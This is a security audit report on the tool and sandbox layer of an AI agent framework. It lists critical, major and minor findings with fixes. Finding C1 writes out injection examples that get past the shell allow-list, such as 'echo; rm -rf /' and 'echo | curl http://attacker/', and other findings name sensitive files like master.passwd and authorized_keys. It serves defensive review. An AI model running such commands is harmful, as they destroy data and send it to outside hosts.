# Audit: agentflow-tools

**Date**: 2026-05-24
**Auditor**: Claude (automated deep audit)
**Crate path**: agentflow-tools/
**Crate version**: 0.1.0 (per `agentflow-tools/Cargo.toml:3`)
**Layer**: L2 (Capability Adapter, security-critical)
**Stability tier**: pre-1.0 / production-leaning. `lib.rs` re-exports a curated public surface; tool-contract fixtures in `tests/fixtures/tool_contracts/` are versioned via `tool_contract_compat.rs`, signaling a contract-stable posture even though the crate version is still `0.1.0`. The security-critical types (`SandboxPolicy`, `SandboxBackend`, `EffectiveCapabilities`, `ToolPermission`, `ToolMetadata`, `SecurityProfile`) are clearly intended as wire- and trace-stable.

## Scope summary

`agentflow-tools` is the security-critical L2 crate that defines the `Tool` trait, the `ToolRegistry`, the three-way capability merge (tool-required → skill → policy → CLI), the in-process `SandboxPolicy` (path/domain/command allow-lists), the OS-level `SandboxBackend` abstraction (`sandbox-exec` on macOS, seccomp-bpf on Linux, `Noop` elsewhere), the `PluginPolicy`, the `SecurityProfile` enum (`dev` / `local` / `production`), and four built-in tools (`ShellTool`, `FileTool`, `HttpTool`, `ScriptTool`). The crate has **no workspace dependencies** — it is correctly isolated at L2 with only `agentflow-agents` consuming it. The audit covers ~4 700 lines of source across 19 files plus 5 integration test files (~870 lines).

## Findings

### CRITICAL (especially security)

- [C1] **ShellTool default backend is `Noop`; in-process command allow-list is trivially bypassable via shell metacharacters** — `agentflow-tools/src/builtin/shell.rs:22-29` (default backend), `agentflow-tools/src/builtin/shell.rs:96-106` (allow-list check + raw `sh -c $cmd` spawn).
  **What**: `ShellTool::new()` wires a `NoopSandboxBackend` by default; opt-in to an enforcing backend requires the caller to chain `.with_os_sandbox()`. The in-process `is_command_allowed(base_cmd)` check splits the command on whitespace, takes the first token, and confirms it against `allowed_commands`. Because the whole command string is then handed to `sh -c`, an attacker only needs to put an allowed verb at position 0: `echo; rm -rf /`, `echo $(rm -rf /)`, `echo | curl http://attacker/`, etc. all pass the check and reach the shell. With the no-op backend the kernel does nothing, so the in-process check is the only line of defense — and it does not actually constrain commands.
  **Why it matters**: The default `SandboxPolicy` allows `echo`, `cat`, `ls`, `grep`, `find`, `sed`, `awk` etc. Any agent that can call `ShellTool` with these prefixes can run arbitrary shell. The README in `lib.rs` shows the canonical wiring with `SandboxPolicy::permissive()`, which then doesn't even check command names. The OS sandbox is the only thing keeping this honest, but it is **opt-in**.
  **Fix**: (a) Document that ShellTool *requires* `.with_os_sandbox()` to be safe, and have `ShellTool::new()` log a `tracing::warn!()` when the backend is `Noop`. (b) Either tokenise the command properly (parse with `shell-words` and reject metacharacters when no OS sandbox is active) or refuse to spawn entirely when `backend.is_enforcing() == false` and the policy is non-permissive. (c) The `SecurityProfile::Production` defaults already set `require_os_sandbox: true` (`security_profile.rs:158`) — wire `ShellTool::new` to consult the active profile and fail-closed if production is active without an enforcing backend.

- [C2] **`HttpTool::new` panics on client build failure in production code** — `agentflow-tools/src/builtin/http.rs:39-42`.
  **What**:
  ```rust
  let client = match client_result {
    Ok(client) => client,
    Err(error) => panic!("Failed to build HTTP client: {}", error),
  };
  ```
  This is the *only* non-test panic in the crate. `Client::build()` can fail for legitimate operational reasons (TLS backend init failure, OS resource exhaustion, fingerprint cert load errors). A panic in a tool constructor will abort the host process — including any server, worker, or CLI that registered this tool.
  **Why it matters**: Violates the project's hard rule against `unwrap()/expect()/panic!()` in non-test code (CLAUDE.md Rust section). Tools are typically registered at startup; a panic here kills the whole agent runtime instead of letting the caller log + degrade.
  **Fix**: Make `HttpTool::new` return `Result<Self, ToolError>`. Map the build error into `ToolError::ExecutionFailed`. Provide an `HttpTool::new_or_panic` variant for tests / examples if a one-line constructor is still wanted.

- [C3] **macOS SBPL profile grants blanket filesystem read of `/Library` and `/private/etc`, leaking sensitive host data into sandboxed children** — `agentflow-tools/src/sandbox/macos.rs:120-133`.
  **What**: The generated profile unconditionally allows `file-read*` on `/Library`, `/private/etc`, `/System`, `/usr/share`, etc. for *every* sandboxed command, regardless of the tool's capabilities. `/Library` on macOS holds user keychains' parent dirs, Application Support, launch daemons; `/private/etc` holds `/etc/passwd`, `/etc/hosts`, system configuration. A shell command run "in the sandbox" can still `cat /Library/.../some.plist` or `cat /private/etc/master.passwd`.
  **Why it matters**: The sandbox is marketed as the kernel-level defense (see `sandbox/mod.rs:1-18`). Operators reading the docs reasonably believe `sandbox-exec` provides confinement; instead the profile is broadly read-permissive on the host filesystem.
  **Fix**: Narrow `/Library` to `/Library/Frameworks` and `/Library/Preferences/.GlobalPreferences.plist` (the minimal set dyld needs); replace `/private/etc` with the specific files dyld reads (`/private/etc/localtime`, `/private/etc/resolv.conf` when `Net` is granted). Better: import the well-known Apple base SBPL profile (`(import "system.sb")`) and add tool-specific overlays instead of hand-rolling.

- [C4] **Linux seccomp filter does not block `openat(O_WRONLY|O_CREAT)`, `creat`, `open` — claimed `FsWrite` denial is incomplete** — `agentflow-tools/src/sandbox/linux.rs:191-205`, with documentation contradicting reality at `sandbox/linux.rs:14-19` and `186-190`.
  **What**: The doc comment at `linux.rs:14-19` claims that "creating new files via `openat(O_WRONLY | O_CREAT)` is denied through the path-creation syscalls", but the actual `fs_write_syscall_numbers()` list (line 191-205) blocks only `unlinkat`, `renameat*`, `mkdirat`, `mknodat`, `symlinkat`, `linkat`, `fchmodat`, `fchownat`, `truncate`, `ftruncate`. It does **not** block `openat`, `open`, or `creat`. A child without `FsWrite` capability can still `openat(AT_FDCWD, "/tmp/evil", O_WRONLY|O_CREAT)` and then `write(2)` (which is also allowed). The seccomp filter does not actually achieve what its docstring claims.
  **Why it matters**: The integration test `sandbox_matrix.rs:267-296` (`os_sandbox_blocks_hardlink_creation_without_fs_write`) covers `linkat` only and would pass. But the doc-promised "no new files" guarantee is false; an attacker confined by seccomp could still create, overwrite, and corrupt arbitrary files where the DAC permits.
  **Fix**: Either (a) add `SYS_openat`, `SYS_openat2`, `SYS_open`, `SYS_creat` with seccomp argument filters that reject `O_WRONLY|O_RDWR|O_CREAT|O_TRUNC` — seccompiler supports `SeccompRule::new(vec![SeccompCondition::new(arg, ...)])` — or (b) downgrade the doc claim to "creates via mknodat/symlinkat/linkat are blocked, but write-via-openat is not because seccomp arg filtering with `O_*` flags is non-trivial". Option (a) is the right one because the broken guarantee is load-bearing for the production profile.

- [C5] **seccomp filter does not block `clone`/`fork`/`execve` despite `Exec` capability gating — a child can spawn a subprocess that escapes the parent's capability set** — `agentflow-tools/src/sandbox/linux.rs:22-24` admits this.
  **What**: The comment at `linux.rs:22-24` notes: *"`Exec` cannot be enforced through seccomp alone, because the child must `execve` once to start. Tools that don't grant `Exec` will already have been denied at the in-process capability merge layer"*. But the *first* `execve` (the one running the user-supplied shell command via `sh -c`) carries the `sh` shell process, which can fork unlimited children — each of which has the same seccomp policy, but the seccomp filter does not block `clone`/`fork`/`execve` afterward. A python script with `Exec` capability can `subprocess.run(["python3", "-c", "..."])` recursively; a shell command without `Exec` capability still gets one `sh -c` invocation (because `wrap_command` runs first and the in-process layer only denies registration, not the subsequent shell fork).
  **Why it matters**: Once any tool with `Exec` is admitted (including shell, script, plugin), the seccomp filter places no upper bound on subprocess creation or capability inheritance. A "denied Exec" tool would never reach the seccomp filter in the first place, so the in-process layer's claim is correct — but the comment implies seccomp is providing some kind of bound, which it is not.
  **Fix**: Restrict the comment to what's true, and consider adding optional `clone`/`fork`/`execve` denial when the tool is single-shot (e.g., `FileTool` should it ever spawn). For shell/script, document that "once admitted, the child can spawn freely within its own seccomp filter".

- [C6] **`SandboxPolicy::is_path_allowed` falls open when `allowed_paths` is empty** — `agentflow-tools/src/sandbox/policy.rs:104-112`.
  **What**: `is_path_allowed` returns `true` (via `path_denial_reason → None`) when `allowed_paths.is_empty()`. The doc comment at `policy.rs:25` says *"If empty, ALL paths are allowed (permissive mode)"*. This is the *opposite* default from `allowed_commands` (which has a hard-coded restrictive default list of 18 read-mostly commands). The asymmetry is dangerous: `FileTool::new(Arc::new(SandboxPolicy::default()))` accepts writes to **any** path — `/etc/passwd`, `~/.ssh/authorized_keys`, etc. — because no caller initialized `allowed_paths`.
  **Why it matters**: A defensible default would be "if `allowed_paths` is empty, deny everything except a documented base set" (matching the command allow-list pattern). The current behavior gives a false sense of security: developers who set `allowed_commands` may think "the sandbox is on" and not realize file writes are wide open.
  **Fix**: (a) Flip the semantic to "empty = deny all" and update tests; or (b) in `SandboxPolicy::default()`, populate `allowed_paths` with a sensible default (e.g., `~/.agentflow`, `/tmp/agentflow`). Either way, document the symmetry. The production profile in `security_profile.rs:158` sets `require_os_sandbox: true` which would catch this at the OS layer, but only if the OS sandbox is actually engaged for `FileTool` — and `FileTool` is in-process, so the OS sandbox doesn't apply.

### MAJOR

- [M1] **`policy.rs:144` uses `unreachable!()` without a reason string** — `agentflow-tools/src/policy.rs:114-148`.
  **What**: The `summarize_params` helper has an `unreachable!()` in the catch-all arm for `Value::Object(_)`, but the outer match has already handled `Value::Object`. CLAUDE.md (Rust section) requires `unreachable!("具体原因")` with explanation. While correct today, refactoring the outer match would make this silent — and bare `unreachable!()` panics with a confusing message in the field.
  **Fix**: `unreachable!("Value::Object is matched in the outer arm at policy.rs:115")` or restructure to avoid the dual-match pattern.

- [M2] **`HttpTool` constructor does not call `.no_proxy()` even though tests rely on a `127.0.0.1` test server** — `agentflow-tools/src/builtin/http.rs:34-49` and `http.rs:413-461`.
  **What**: Per CLAUDE.md's "Rust HTTP Testing Guidelines", `reqwest` clients that talk to local listeners must use `.no_proxy()`. Tests in `http.rs:413` (`explicit_policy_allows_loopback`) and `http.rs:429` (`redirect_destination_is_checked_before_following`) hit `127.0.0.1:<random_port>` through the production client; if a developer (or CI runner) has a system HTTP proxy (Clash/V2Ray/corporate proxy), these tests will fail with `IncompleteMessage` / `connection closed before message completed` and the failure will be misleading.
  **Why it matters**: The crate's own engineering rules document this exact failure mode. It is a self-inflicted CI flake waiting to happen.
  **Fix**: Add a `HttpTool::new_with_client(client, policy)` constructor, and use `Client::builder().no_proxy().build()` in tests. Optionally, `HttpTool::new` could disable proxy when `SandboxPolicy::allow_loopback_network_access` is true (best-effort detection) — but the cleaner approach is constructor injection.

- [M3] **`SandboxStatus::backend` is a `String` (not a stable enum) so trace consumers must string-match** — `agentflow-tools/src/sandbox/backend.rs:120-126`.
  **What**: `SandboxStatus.backend: String` is described as "Stable backend name (`"sandbox-exec"`, `"seccomp"`, `"noop"`)" — three known values, currently hand-typed in three places. A typo in a future backend (`"seccomp-bpf"` vs `"seccomp"`) would silently break trace consumers and the doctor command. The same crate already uses `enum`-with-`as_str()` for `SandboxEnforcement`, `GrantSource`, `Capability`, `ToolSource`. The inconsistency is jarring.
  **Fix**: Introduce `SandboxBackendKind` enum, derive `Serialize`/`Deserialize` with `rename_all = "kebab-case"` to preserve wire compatibility. Existing string-typed JSON consumers continue to deserialize cleanly.

- [M4] **macOS `wrap_command` leaks profile temp files into `/var/folders` indefinitely** — `agentflow-tools/src/sandbox/macos.rs:80-96`.
  **What**: `tempfile::Builder` creates a `NamedTempFile`, then `.keep()` strips its drop guard so the file persists indefinitely. The comment at line 87-89 acknowledges this: *"macOS leaks small temp files into /var/folders by design; callers can sweep `agentflow-sandbox-*.sb` if needed"*. On a long-running server (`agentflow serve`) this produces unbounded growth of small SBPL files.
  **Why it matters**: Production servers cannot rely on operator sweeps. A misconfigured CI host running thousands of shell commands per day will accumulate hundreds of MB of SBPL profiles.
  **Fix**: Spawn a background reaper task at server startup, or use `inotify`/`fsevents` to drop the profile after the child exits. Simpler: pipe the profile to `sandbox-exec` via stdin (the `-p` flag accepts an inline profile and avoids the temp file entirely — see how `sandbox_macos_test.rs:30-37` exercises `-p`).

- [M5] **`SandboxScope::with_read_paths`/`with_write_paths` accept arbitrary paths but offer no canonicalization, allowing relative paths to silently mis-scope** — `agentflow-tools/src/sandbox/backend.rs:34-50`.
  **What**: The SBPL profile generator (`macos.rs:142-167`) calls `escape_sbpl(path)` which lossy-converts a `PathBuf` to a string and embeds it in `(allow file-read* (subpath "..."))`. SBPL's `subpath` is matched against the canonical path of the access target, so passing a relative path (e.g. `./allowed`) into `with_read_paths` produces a rule like `(allow file-read* (subpath "./allowed"))` — which sandbox-exec interprets relative to its own cwd, not the child's. The result: rules silently no-op while operators think they're enforcing.
  **Fix**: In `wrap_command`, canonicalize every `read_paths`/`write_paths` entry before profile generation; return `SandboxError::Prepare` if canonicalization fails (entry does not exist on disk). Add a doc note on `SandboxScope` saying paths *must* be absolute.

- [M6] **`ToolRegistry::register` silently replaces a tool with the same name — no warning, no audit entry** — `agentflow-tools/src/registry.rs:82-84`.
  **What**: `register` just does `self.tools.insert(...)`. A misconfigured CLI or plugin host that registers the same tool twice (e.g., `FileTool` once from builtin and once from a plugin with `name = "file"`) will silently overwrite the first with the second, potentially downgrading security guarantees. No audit log entry is produced.
  **Fix**: Either reject duplicate names (`Result<(), ToolError::AlreadyRegistered>`) or emit `tracing::warn!()` with both `ToolMetadata.source` values. The doc currently says "silently replaced" — make this a warning at minimum.

- [M7] **`ToolRegistry::tools` uses `HashMap`; lookup order is non-deterministic, but `openai_tools_array` does not sort** — `agentflow-tools/src/registry.rs:17-22`, `registry.rs:180-195`.
  **What**: `prompt_tools_description` sorts its lines (line 205: `lines.sort();`) for deterministic prompt-engineering. But `openai_tools_array` (line 180) iterates `self.tools.values()` directly without sorting, so the order of the OpenAI tools array depends on `HashMap`'s hashing-and-resizing state. Two consecutive runs can produce different array orderings, breaking prompt caching for any provider that hashes the tools array.
  **Fix**: Sort `openai_tools_array` by `name()` before returning, matching `prompt_tools_description`. Or back the registry with `BTreeMap<String, Arc<dyn Tool>>` — `T1.7.3 / 1.8.0` benchmark tests in `tool_registry_benchmarks.rs` would not regress meaningfully at 10k tools.

- [M8] **`SandboxPolicy::path_denial_reason` calls `Path::canonicalize` synchronously inside an async tool execution path** — `agentflow-tools/src/builtin/file.rs:85` → `policy.rs:124` → `canonicalize_existing_prefix`.
  **What**: Every `FileTool::execute` call enters `path_denial_reason`, which calls `canonicalize_existing_prefix`, which can perform multiple synchronous `Path::canonicalize` calls and a `while path.pop()` loop hitting the filesystem repeatedly. This is a blocking syscall inside the Tokio executor.
  **Why it matters**: Under a busy agent loop with many file ops, the Tokio worker thread will stall on filesystem latency (especially over NFS or with FUSE). The hardlink check in `file.rs:182-199` is also synchronous.
  **Fix**: Wrap path validation in `tokio::task::spawn_blocking` or use `tokio::fs::canonicalize` (which already exists in tokio's `fs` module). For high-volume FileTool callers this matters.

- [M9] **`evaluate_capabilities` records to `capability_audit` only on `execute`, not on `evaluate_capabilities` itself** — `agentflow-tools/src/registry.rs:144-161` vs `216-258`.
  **What**: `evaluate_capabilities` is a public inspection method (used by `agentflow doctor` and by the harness pre-tool hook), but it does *not* push the resolved `EffectiveCapabilities` into `capability_audit`. Only `execute` writes to the audit. So the audit log captures "tool calls actually executed" but misses "tool calls that were inspected and would have been denied" — exactly the cases an operator wants to see in a doctor run.
  **Fix**: Decide whether the audit log is "what executed" or "every decision". If the latter, push from `evaluate_capabilities` as well. Document the choice in the rustdoc.

### MINOR

- [m1] **`Tool::prompt_description` uses `unwrap_or_else(|_| "{}".to_string())` to swallow `serde_json` errors** — `agentflow-tools/src/tool.rs:389-396`. Serializing a `Value` to a string can't realistically fail for a well-formed schema; the fallback masks a developer bug. Use `serde_json::to_string(&self.parameters_schema()).map_err(...).unwrap_or_default()` and log on error.

- [m2] **`SandboxPolicy::max_exec_time_secs: u64` default = 30s, permissive = 60s** — `agentflow-tools/src/sandbox/policy.rs:70,89`. No upper bound. A misconfigured policy with `u64::MAX` will hang the Tokio task indefinitely. Add a sanity cap (e.g., 3 600s) and warn on construction.

- [m3] **`HttpTool::max_response_chars = 8_000` is hard-coded** — `agentflow-tools/src/builtin/http.rs:47`. No builder method to override; agents needing larger responses (RAG, web scraping) have to fork the tool. Add `HttpTool::with_max_response_chars(usize)`.

- [m4] **`ScriptTool` interpreter lookup uses `python3`/`bash`/`node` from PATH unpinned** — `agentflow-tools/src/builtin/script.rs:327-334`. The interpreter is whatever the spawn host's PATH resolves to. Combined with the noop sandbox default, a host with a shim `python3 → curl` (unlikely but possible) would be hijacked. The SBPL profile pins `/usr/bin/sandbox-exec` but does *not* pin interpreter paths.
  **Fix**: Add a `ScriptTool::with_interpreter(ext, abs_path)` builder so operators can pin `python3` to `/usr/bin/python3`.

- [m5] **`ToolRegistry::policy_audit_log` returns `Vec` clones on every call** — `agentflow-tools/src/registry.rs:163-177`. For long-running servers, the audit log grows unbounded and every export clones the whole thing. Add a max-size with FIFO eviction, or expose a streaming iterator.

- [m6] **`ToolPolicyDecision.params_summary` is structurally fine but does not redact key names** — `agentflow-tools/src/policy.rs:114-148`. Values are reduced to type names (`"string"`, `"number"`, etc.) which is good. But key names like `"api_key"`, `"password"`, `"secret"` are emitted verbatim. This is normally fine (they identify the parameter, not its content) but for highly sensitive deployments consider an optional key-name redaction allowlist.

- [m7] **`ShellTool::sandbox_status()` overrides the default and surfaces the backend, but `FileTool` and `HttpTool` correctly return `None`** — `agentflow-tools/src/builtin/shell.rs:85-87`, `agentflow-tools/src/builtin/file.rs`, `agentflow-tools/src/builtin/http.rs`. The pattern is consistent — but the Cargo lint `missing_docs` is not enabled at lib level, so a future tool author might forget to override. Add `#![warn(missing_docs)]` at `lib.rs:1` and add doctests on the trait method.

- [m8] **`ToolOutputPart::Image` carries `data: String` with no length validation** — `agentflow-tools/src/tool.rs:28-32`. A misbehaving MCP server can return a 100 MB base64 image; the tool harness would happily ferry it. Add a max-size knob on `ToolRegistry` or document the responsibility.

- [m9] **Test `default_policy_blocks_localhost_dns_resolution` (`http.rs:370-382`) hits real DNS — could fail in airgapped CI** — Test invokes `tokio::net::lookup_host("localhost", 9)` indirectly. On a host with no `/etc/hosts` entry for `localhost` (rare but possible), the test would error before hitting the policy check.

- [m10] **`SandboxPolicy::allowed_domains` matching is suffix-based with `.` boundary, but the doc only says "host suffixes"** — `agentflow-tools/src/sandbox/policy.rs:147-155`. Code at line 154 correctly uses `domain.ends_with(&format!(".{}", d))` to avoid `evilexample.com` matching `example.com`. The doc comment at line 27 should explicitly call this out.

- [m11] **`ToolError` does not carry the tool name on most variants** — `agentflow-tools/src/error.rs:1-28`. `NotFound`, `ExecutionFailed`, `InvalidParams`, `PolicyDenied` all just take a `message: String`. Trace consumers would benefit from a structured `tool: String` field for filtering. Compatible refactor: add `#[from_struct]` via thiserror's struct variants.

- [m12] **No `clippy::missing_safety_doc` lint enforcement on `unsafe` blocks** — `agentflow-tools/src/sandbox/linux.rs:113-117`. The `unsafe` block calling `command.pre_exec(...)` has a SAFETY comment (good!), but no lint enforces this. Add `#![warn(unsafe_op_in_unsafe_fn)]` to `lib.rs`.

### POSITIVE OBSERVATIONS

- **Clean L2 boundary**: zero workspace dependencies. `agentflow-tools` only depends on `agentflow-agents` (as a consumer). No `agentflow-core` import — the crate truly stands alone.
- **Excellent capability merge design**: `EffectiveCapabilities::resolve` (`capability.rs:148-208`) is a textbook intersection over four labeled layers, with a per-layer audit trace, comprehensive tests (10 unit tests at `capability.rs:248-413`), and clear rustdoc.
- **`SandboxEnforcement` tri-state distinguishes `Permissive` (backend present but disabled) from `Disabled` (no backend on this platform)** — this is exactly the distinction operators need (`backend.rs:78-114`).
- **HTTP SSRF defenses are comprehensive**: scheme check, cloud metadata host allowlist (`metadata.google.internal`, `instance-data`, etc.), explicit IP class checks (loopback/link-local/private/cloud-metadata) **including IPv6 link-local `fe80::/10` and ULA `fc00::/7`** at `http.rs:336-339`, **redirect-target re-validation** at `http.rs:209-235`. The `redirect_destination_is_checked_before_following` test (`http.rs:429-445`) confirms the redirect to `169.254.169.254` is blocked.
- **FileTool path-traversal coverage**: `sandbox_matrix.rs:56-97` exercises traversal, absolute-outside read/write, symlink escape, and (with `allow_hardlinked_files = false` default) hardlink-based exfiltration. `policy.rs:114-122` explicitly rejects `ParentDir` and `Prefix` components.
- **ScriptTool dual path validation**: rejects path-traversal via plain-filename check (`script.rs:131-139`), then canonicalizes both the script and the scripts_dir and confirms `starts_with` (`script.rs:151-177`) — defending against symlink escape (test at `script.rs:424-438` confirms).
- **No env-var sniffing**: zero `env::var` calls in `builtin/` or `sandbox/` (verified). Tools cannot be reconfigured by environment variables an attacker controls.
- **`ToolPolicyDecision.params_summary` reduces values to type names** — keys remain visible (param-name visibility is necessary for debugging), but values never leak.
- **Tool-contract fixtures versioned**: `tests/fixtures/tool_contracts/*.json` + `tool_contract_compat.rs` round-trip these — protects against accidental wire breakage of `ToolMetadata` / `ToolDefinition` / `ToolOutputPart` shapes.
- **OS sandbox integration tests are present**: both `sandbox_macos.rs` and `sandbox_linux.rs` actually verify **denial** (not just happy-path): `macos_sandbox_blocks_write_outside_scope` confirms the file was *not* created; `linux_seccomp_blocks_socket_when_net_capability_absent` confirms socket creation fails. Skip-guards keep them honest on environments without `sandbox-exec` or python3.
- **Heavyweight sandbox dependency correctly target-gated**: `seccompiler` and `libc` are listed only under `[target.'cfg(target_os = "linux")'.dependencies]` (`Cargo.toml:25-27`). macOS users do not pay the seccomp compile cost.
- **`SecurityProfile::Production` fails closed across the board**: `require_api_token: true`, `require_os_sandbox: true`, `allow_noop_backend: false`, `allow_subprocess_plugins: false`, `default_capabilities: [FsRead]` only (`security_profile.rs:138-172`). The serde representation is the operator's source of truth (`security_profile.rs:312-336` confirms JSON keys).
- **`PluginPolicy::evaluate` records every gate decision and aggregates deny reasons** (`plugin_policy.rs:99-181`) — the structured `PluginPolicyDecision` is replayable.
- **All `ToolSource` enum variants** (`Builtin`, `Script`, `Mcp`, `Workflow`) **are exhaustively handled** in `ToolPermissionSet::builtin`/`script`/`mcp`/`workflow` constructors and in `Capability::from_permission`.

## Metrics

- Source files: 19 (`src/*.rs` + `src/builtin/*.rs` + `src/sandbox/*.rs`)
- Lines of code: 4 681 source + 870 test/example
- Built-in tools: 4 — `ShellTool`, `FileTool`, `HttpTool`, `ScriptTool`
- Sandbox backends: 3 — `MacosSandboxExecBackend`, `LinuxSeccompBackend`, `NoopSandboxBackend`
- Test files: 14 in-source unit-test mods + 5 integration tests (`sandbox_linux.rs`, `sandbox_macos.rs`, `sandbox_matrix.rs`, `tool_contract_compat.rs`, `tool_registry_benchmarks.rs`)
- `unwrap()/expect()` in non-test code: **0** unwrap, **0** expect — all matches above the test-mod boundary are inside `#[cfg(test)]`. However:
  - **1 `panic!()`** in non-test code at `builtin/http.rs:41` (Critical C2)
  - **1 `unreachable!()` without message** in non-test code at `policy.rs:144` (Major M1)
  - Total non-test panic-paths: 2.
- TODO/FIXME/XXX/HACK in code: **0** (clean)
- Public items missing rustdoc: estimated **~5%** of 67 public items. Most public types/functions have `///` docs; a handful of `as_str()` methods and constructors lack them.

## Recommendations (prioritized)

1. **Fix [C1] ShellTool default-noop bypass** — either log a loud warning when ShellTool is constructed with the noop backend, refuse to spawn under a non-permissive policy without an enforcing backend, or tokenise the command and reject shell metacharacters. This is the single largest security gap.
2. **Fix [C2] `HttpTool::new` panic** — replace with `Result<Self, ToolError>`. One-line change, removes the only non-test `panic!` in the crate.
3. **Fix [C4] seccomp `FsWrite` denial completeness** — add `openat`/`openat2`/`open`/`creat` with `O_WRONLY|O_RDWR|O_CREAT|O_TRUNC` argument filters, or downgrade the doc claim. The current state is "doc says we block writes, kernel doesn't" — a load-bearing safety property is broken.
4. **Fix [C3] macOS SBPL profile overreach** — narrow `/Library` and `/private/etc` to the minimal dyld-required subpaths; consider `(import "system.sb")` instead of hand-rolled rules.
5. **Fix [C6] `SandboxPolicy::is_path_allowed` asymmetric default** — match the command allow-list pattern (empty = deny) or seed `allowed_paths` with a sensible default. Document the choice in `SandboxPolicy::default()` rustdoc.
6. **Address [M2] `HttpTool` no_proxy gap** — preempt CI flake on dev machines with system proxies.
7. **Address [M4] macOS profile temp-file leak** — switch to `sandbox-exec -p` with stdin profile (matches how the integration test already invokes sandbox-exec).
8. **Address [M5] `SandboxScope` path canonicalization** — silent rule-no-op is a footgun.
9. **Address [M7] `openai_tools_array` non-deterministic order** — switch to BTreeMap or sort before emit; prompt caching depends on it.
10. **Address [M6] `ToolRegistry::register` silent overwrite** — at minimum, emit `tracing::warn!()` with both sources.

End of report.
